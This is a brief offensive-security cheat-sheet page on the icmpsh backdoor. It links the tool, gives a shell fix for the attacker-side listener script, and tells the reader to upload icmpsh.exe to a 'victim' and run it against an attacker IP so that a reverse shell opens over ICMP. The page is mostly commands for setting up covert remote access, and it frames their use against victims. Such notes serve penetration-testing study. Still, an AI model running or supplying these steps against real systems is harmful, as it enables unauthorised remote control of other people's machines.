---
description: 'https://github.com/inquisb/icmpsh'
---

# ICMPsh

Download the backdoor from: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

## Client side

Execute the script: **run.sh**

**If you get some error, try to change the lines:**

```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```

**For:**

```bash
echo Please insert the IP where you want to listen
read IP
```

## **Victim Side**

Upload **icmpsh.exe** to the victim and execute:

```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```

